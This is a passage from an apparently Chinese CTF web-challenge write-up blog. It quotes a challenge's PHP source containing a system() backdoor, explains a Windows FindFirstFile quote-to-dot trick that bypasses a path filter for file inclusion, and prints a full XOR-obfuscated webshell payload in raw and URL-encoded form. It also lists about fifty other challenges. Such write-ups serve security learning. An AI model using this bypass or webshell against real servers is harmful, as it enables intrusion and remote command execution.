&#x2F;&#x2F; ain&#39;t Argon2, ain&#39;t pbkdf2. what could go wrong?</span><br><span class="line">            $flag &#x3D; hash(&#39;sha256&#39;, $seed);</span><br><span class="line">            if($_GET[$flag])&#123;</span><br><span class="line">                @system($_GET[$flag]);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                @unserialize($_SESSION[$flag]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Don&#39;t call me a savage... I gave everything you need &#x2F;&#x2F;</span><br><span class="line">    if($_SERVER[&#39;QUERY_STRING&#39;] &#x3D;&#x3D;&#x3D; &quot;show-me-the-hint&quot;)&#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; XSS protection and hints ^-^ &#x2F;&#x2F;</span><br><span class="line">    header(&#39;X-Hint: &#x2F;index.php?show-me-the-hint&#39;);</span><br><span class="line">    header(&#39;X-Frame-Options: DENY&#39;);</span><br><span class="line">    header(&#39;X-XSS-Protection: 1; mode&#x3D;block;&#39;);</span><br><span class="line">    header(&#39;X-Content-Type-Options: nosniff&#39;);</span><br><span class="line">    header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;);</span><br><span class="line">    header(&#39;Cache-Control: no-store, no-cache, must-revalidate, max-age&#x3D;0&#39;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;header(&quot;Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;nonce-$&#123;seed&#125;&#39; &#39;unsafe-eval&#39;;&quot; .</span><br><span class="line">    &#x2F;&#x2F;&quot;font-src &#39;nonce-$&#123;seed&#125;&#39; fonts.gstatic.com; style-src &#39;nonce-$&#123;seed&#125;&#39; fonts.googleapis.com;&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Hello, JSON! &#x2F;&#x2F;</span><br><span class="line">    $parsed_url &#x3D; explode(&quot;&amp;&quot;, $_SERVER[&#39;QUERY_STRING&#39;]);</span><br><span class="line">    if(count($parsed_url) &gt;&#x3D; 2)&#123;</span><br><span class="line">        header(&quot;Content-Type:text&#x2F;json&quot;);</span><br><span class="line">        switch($parsed_url[0])&#123;</span><br><span class="line">            case &quot;get&quot;:</span><br><span class="line">                $get &#x3D; new Get($parsed_url[1]);</span><br><span class="line">                $data &#x3D; $get-&gt;get();</span><br><span class="line">                break;</span><br><span class="line">            case &quot;put&quot;:</span><br><span class="line">                $put &#x3D; new Put($parsed_url[1], $_POST);</span><br><span class="line">                $data &#x3D; $put-&gt;put();</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                $data &#x3D; [&quot;msg&quot; &#x3D;&gt; &quot;Invalid data.&quot;];</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">        die(json_encode($data));</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>代码主要分为三个部分</p>
<p><strong>过滤函数：</strong></p>
<p><img src="https://img.npfs06.top/20210331191241.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>对文件名和文件内容的waf</p>
<p><strong>PUT类：</strong></p>
<p><img src="https://img.npfs06.top/20210331190910.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>put类可以进行写文件操作，文件名可控但是要经过path_sanitizer过滤，然后拼接写在files目录下，path_sanitizer函数会过滤</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$filter</span> = [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27;.\\&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>];</span><br></pre></td></tr></table></figure>
<p>写的内容也可控，但是要过这个正则</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">&quot;/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-\\\&#x27;\&quot;\=\(\)\[\]\;]/u&quot;</span>, <span class="string">&quot;*Nope*&quot;</span>, (<span class="keyword">string</span>)</span><br></pre></td></tr></table></figure>
<p><strong>GET类</strong></p>
<p><img src="https://img.npfs06.top/20210331195107.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>get类可以进行文件读取，并且在最后面有个include操作，所以猜侧具体思路是写文件，然后用include包含执行。<br>传入文件名和PUT类类似，可控，但是要经过path_sanitizer函数过滤，并且也会在前面自动拼接./files/。不过有一点不同之处，如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$read_file</span> = <span class="string">&quot;./files/&quot;</span> . <span class="keyword">$this</span>-&gt;filename;</span><br><span class="line"><span class="variable">$read_file_with_hardened_filter</span> = <span class="string">&quot;./files/&quot;</span> . path_sanitizer(<span class="keyword">$this</span>-&gt;filename, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>这里path_sanitizer函数第二个参数为真，会在原过滤的基础上把正反斜杠替换为空<br>经过两种过滤方式输出的文件名和文件内容都必须不一样，否者就直接返回了，这段代码通过后就会<code>@include(&quot;./files/&quot; . $this-&gt;filename);</code>，所以我们只要绕过这个if判断就可以包含了</p>
<p>对于Windows的文件读取，有一个小Trick：使用<code>FindFirstFile</code>这个API的时候，其会把<code>&quot;</code>解释为<code>.</code>。意即：<code>shell&quot;php</code> === <code>shell.php</code>。</p>
<p>因此，回到这题来。我们上传一个文件，名字设为<code>test</code>。然后，通过<code>&quot;/test</code>即可读取。此时：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$read</span>_file = <span class="string">&quot;./files/./test&quot;</span>;</span><br><span class="line"><span class="symbol">$read</span>_file_with_hardened_filter = <span class="string">&quot;./files/.test&quot;</span>;</span><br><span class="line">file_get_contents(<span class="symbol">$read</span>_file) = <span class="string">&#x27;实际文件内容&#x27;</span>;</span><br><span class="line">file_get_contents(<span class="symbol">$read</span>_file_with_hardened_filter) = <span class="literal">false</span> <span class="comment">//文件不存在</span></span><br></pre></td></tr></table></figure>
<p>这样就绕过了文件名的限制</p>
<p>最后就是构建无字母数字shell了<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<p>这里采用异或的方法</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;?=</span><span class="variable">$__</span><span class="operator">=</span>(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;(&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;.&quot;</span>).(<span class="string">&quot;)&quot;</span><span class="operator">^</span><span class="string">&quot;@&quot;</span>).(<span class="string">&quot;-&quot;</span><span class="operator">^</span><span class="string">&quot;@&quot;</span>);((<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;.&quot;</span>).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;^&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;=&quot;</span>).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;_&quot;</span>).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;]&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="variable">$__</span>(<span class="operator">!</span>@<span class="variable">$_</span><span class="operator">+!</span>@<span class="variable">$_</span><span class="operator">+!</span>@<span class="variable">$_</span><span class="operator">+!</span>@<span class="variable">$_</span><span class="operator">+!</span>@<span class="variable">$_</span>)).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="variable">$__</span>(<span class="operator">!</span>@<span class="variable">$_</span><span class="operator">-!</span>@<span class="variable">$_</span>)).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;^&quot;</span>))(((<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="variable">$__</span>(<span class="operator">!</span>@<span class="variable">$_</span><span class="operator">+!</span>@<span class="variable">$_</span>)).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;^&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;$&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;(&quot;</span>))((((<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;<span class="subst">\\</span>&quot;</span>).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;^&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;(&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;=&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="variable">$__</span>(<span class="operator">!</span>@<span class="variable">$_</span><span class="operator">-!</span>@<span class="variable">$_</span>)).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="variable">$__</span>(<span class="operator">!</span>@<span class="variable">$_</span><span class="operator">-!</span>@<span class="variable">$_</span>)).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="variable">$__</span>(<span class="operator">!</span>@<span class="variable">$_</span><span class="operator">+!</span>@<span class="variable">$_</span><span class="operator">+!</span>@<span class="variable">$_</span><span class="operator">+!</span>@<span class="variable">$_</span>)).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;^&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;=&quot;</span>).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;_&quot;</span>).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;^&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;.&quot;</span>).(<span class="string">&quot;]&quot;</span><span class="operator">^</span><span class="string">&quot;.&quot;</span>))())))<span class="operator">?&gt;</span></span><br></pre></td></tr></table></figure>


<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">%3</span>C<span class="variable">%3</span>F<span class="variable">%3</span>D<span class="variable">%24</span>__<span class="variable">%3</span>D(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>(<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>.<span class="variable">%22</span>).(<span class="variable">%22</span>)<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%40</span><span class="variable">%22</span>).(<span class="variable">%22</span>-<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%40</span><span class="variable">%22</span>)<span class="variable">%3</span>B((<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>.<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%3</span>D<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>_<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%5</span>D<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%24</span>__(!<span class="variable">%40</span><span class="variable">%24</span>_<span class="variable">%2</span>B!<span class="variable">%40</span><span class="variable">%24</span>_<span class="variable">%2</span>B!<span class="variable">%40</span><span class="variable">%24</span>_<span class="variable">%2</span>B!<span class="variable">%40</span><span class="variable">%24</span>_<span class="variable">%2</span>B!<span class="variable">%40</span><span class="variable">%24</span>_)).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%24</span>__(!<span class="variable">%40</span><span class="variable">%24</span>_-!<span class="variable">%40</span><span class="variable">%24</span>_)).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>))(((<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%24</span>__(!<span class="variable">%40</span><span class="variable">%24</span>_<span class="variable">%2</span>B!<span class="variable">%40</span><span class="variable">%24</span>_)).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%24</span><span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>(<span class="variable">%22</span>))((((<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>(<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%3</span>D<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%24</span>__(!<span class="variable">%40</span><span class="variable">%24</span>_-!<span class="variable">%40</span><span class="variable">%24</span>_)).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%24</span>__(!<span class="variable">%40</span><span class="variable">%24</span>_-!<span class="variable">%40</span><span class="variable">%24</span>_)).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%24</span>__(!<span class="variable">%40</span><span class="variable">%24</span>_<span class="variable">%2</span>B!<span class="variable">%40</span><span class="variable">%24</span>_<span class="variable">%2</span>B!<span class="variable">%40</span><span class="variable">%24</span>_<span class="variable">%2</span>B!<span class="variable">%40</span><span class="variable">%24</span>_)).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%3</span>D<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>_<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>.<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>D<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>.<span class="variable">%22</span>))())))<span class="variable">%3</span>F<span class="variable">%3</span>E<span class="variable">%0</span>A</span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210331185008.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>

      </div>
      
      
      
    </div>
    

    
    
    


          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BF%98%E8%AE%B0%E5%93%AA%E9%A2%98%E4%BA%86"><span class="nav-number">1.</span> <span class="nav-text">(忘记哪题了)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%EF%BC%88%E5%BF%98%E8%AE%B0%E5%93%AA%E9%A2%98%E4%BA%86%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">（忘记哪题了）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%EF%BC%88%E5%BF%98%E8%AE%B0%E5%93%AA%E9%A2%98%E4%BA%86%EF%BC%89-1"><span class="nav-number">3.</span> <span class="nav-text">（忘记哪题了）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%EF%BC%88%E5%BF%98%E8%AE%B0%E5%93%AA%E9%A2%98%E4%BA%86%EF%BC%89-2"><span class="nav-number">4.</span> <span class="nav-text">（忘记哪题了）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="nav-number">5.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-EasySQL"><span class="nav-number">6.</span> <span class="nav-text">[SUCTF 2019]EasySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="nav-number">7.</span> <span class="nav-text">[护网杯 2018]easy_tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-number">8.</span> <span class="nav-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HCTF-2018-admin-Flask-session%E4%BC%AA%E9%80%A0"><span class="nav-number">9.</span> <span class="nav-text">[HCTF 2018]admin  Flask session伪造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="nav-number">10.</span> <span class="nav-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MRCTF2020-Ezpop"><span class="nav-number">11.</span> <span class="nav-text">[MRCTF2020]Ezpop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="nav-number">12.</span> <span class="nav-text">[网鼎杯 2020 青龙组]AreUSerialz</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF2020-EasySearch"><span class="nav-number">13.</span> <span class="nav-text">[BJDCTF2020]EasySearch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="nav-number">14.</span> <span class="nav-text">[网鼎杯 2020 朱雀组]Nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="nav-number">15.</span> <span class="nav-text">[极客大挑战 2019]RCE ME</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FBCTF2019-RCEService"><span class="nav-number">16.</span> <span class="nav-text">[FBCTF2019]RCEService</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb"><span class="nav-number">17.</span> <span class="nav-text">[GKCTF2020]EZ三剑客-EzWeb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Zer0pts2020-Can-you-guess-it"><span class="nav-number">18.</span> <span class="nav-text">[Zer0pts2020]Can you guess it?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HITCON-2017-SSRFme"><span class="nav-number">19.</span> <span class="nav-text">[HITCON 2017]SSRFme</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-EasyWeb"><span class="nav-number">20.</span> <span class="nav-text">[SUCTF 2019]EasyWeb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GYCTF2020-Ezsqli"><span class="nav-number">21.</span> <span class="nav-text">[GYCTF2020] Ezsqli</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#V-amp-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-CHECKIN"><span class="nav-number">22.</span> <span class="nav-text">[V&amp;N2020 公开赛]CHECKIN</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2018-SimplePHP"><span class="nav-number">23.</span> <span class="nav-text">[SWPUCTF 2018]SimplePHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B"><span class="nav-number">24.</span> <span class="nav-text">[BJDCTF 2nd]文件探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-encode-and-encode"><span class="nav-number">25.</span> <span class="nav-text">[HarekazeCTF2019]encode_and_encode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Online-Proxy"><span class="nav-number">26.</span> <span class="nav-text">[RoarCTF 2019]Online Proxy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown"><span class="nav-number">27.</span> <span class="nav-text">[网鼎杯 2020 白虎组]PicDown</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HFCTF2020-JustEscape"><span class="nav-number">28.</span> <span class="nav-text">[HFCTF2020]JustEscape</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#b01lers2020-Welcome-to-Earth"><span class="nav-number">29.</span> <span class="nav-text">[b01lers2020]Welcome to Earth</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GYCTF2020-EasyThinking"><span class="nav-number">30.</span> <span class="nav-text">[GYCTF2020]EasyThinking</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish"><span class="nav-number">31.</span> <span class="nav-text">[网鼎杯2018]Unfinish</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment"><span class="nav-number">32.</span> <span class="nav-text">[网鼎杯 2018]Comment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret"><span class="nav-number">33.</span> <span class="nav-text">[CISCN2019 华东南赛区]Double Secret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bestphp%E2%80%99s-revenge"><span class="nav-number">34.</span> <span class="nav-text">bestphp’s revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SCTF2019-Flag-Shop"><span class="nav-number">35.</span> <span class="nav-text">[SCTF2019]Flag Shop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RootersCTF2019-I-lt-3-Flask"><span class="nav-number">36.</span> <span class="nav-text">[RootersCTF2019]I_&lt;3_Flask</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NPUCTF2020-ezinclude"><span class="nav-number">37.</span> <span class="nav-text">[NPUCTF2020]ezinclude</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Simple-Upload"><span class="nav-number">38.</span> <span class="nav-text">[RoarCTF 2019]Simple Upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">39.</span> <span class="nav-text">[安洵杯 2019]不是文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-StrongestMind"><span class="nav-number">40.</span> <span class="nav-text">[GXYCTF2019]StrongestMind</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GYCTF2020-Ez-Express"><span class="nav-number">41.</span> <span class="nav-text">[GYCTF2020]Ez_Express</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2"><span class="nav-number">42.</span> <span class="nav-text">[CISCN2019 华东北赛区]Web2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPU2019-Web4"><span class="nav-number">43.</span> <span class="nav-text">[SWPU2019]Web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-Avatar-Uploader-1"><span class="nav-number">44.</span> <span class="nav-text">[HarekazeCTF2019]Avatar Uploader 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2018-GetShell"><span class="nav-number">45.</span> <span class="nav-text">[SUCTF 2018]GetShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ISITDTU-2019-EasyPHP"><span class="nav-number">46.</span> <span class="nav-text">[ISITDTU 2019]EasyPHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BSidesCF-2019-SVGMagic"><span class="nav-number">47.</span> <span class="nav-text">[BSidesCF 2019]SVGMagic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HFCTF2020-BabyUpload"><span class="nav-number">48.</span> <span class="nav-text">[HFCTF2020]BabyUpload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GoogleCTF2019-Quals-Bnv"><span class="nav-number">49.</span> <span class="nav-text">[GoogleCTF2019 Quals]Bnv</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSAWQual-2019-Web-Unagi"><span class="nav-number">50.</span> <span class="nav-text">[CSAWQual 2019]Web_Unagi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava"><span class="nav-number">51.</span> <span class="nav-text">[网鼎杯 2020 青龙组]filejava</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98-1"><span 